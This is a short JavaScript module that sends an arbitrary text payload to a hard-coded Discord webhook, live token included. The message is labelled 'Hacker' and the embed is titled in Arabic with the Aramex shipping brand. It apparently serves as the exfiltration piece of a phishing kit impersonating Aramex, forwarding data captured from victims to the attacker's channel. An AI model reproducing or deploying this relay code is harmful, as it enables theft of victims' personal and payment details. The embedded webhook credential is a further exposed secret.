import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1324361892130586634/E4PzG2V_efdqxJl2TV7SjDcWS-W7_yqHOlqmddf3TvZe3swB_uMX5eLKx2TPR1k7bPAG",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
